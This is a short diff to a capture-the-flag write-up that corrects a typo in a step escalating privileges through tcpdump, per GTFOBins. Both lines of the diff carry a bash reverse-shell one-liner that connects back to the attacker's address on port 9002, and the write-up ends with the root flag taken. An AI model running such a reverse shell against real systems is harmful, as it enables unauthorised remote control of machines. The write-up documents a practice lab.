@@ -152,7 +152,7 @@ Easy win. According to [GTFOBins](https://gtfobins.github.io/gtfobins/tcpdump/#s
 
 <img width="1455" height="392" alt="2025-08-05 140040" src="https://github.com/user-attachments/assets/68e706d9-a95a-400c-9e68-f7a7a1e7f774" />
 
-I will just the "COMMAND" variable to a `/bin/bash -i >& /dev/tcp/10.10.14.73/9002 0>&1` and start a local listener on port 9002.
+I will just change the "COMMAND" variable to a `/bin/bash -i >& /dev/tcp/10.10.14.73/9002 0>&1` and start a local listener on port 9002.
 
 <img width="1144" height="377" alt="2025-08-05 140708" src="https://github.com/user-attachments/assets/21e4788b-5dc3-4595-86b6-97ab921d29d6" />
 And that’s it, root flag grabbed, box done.
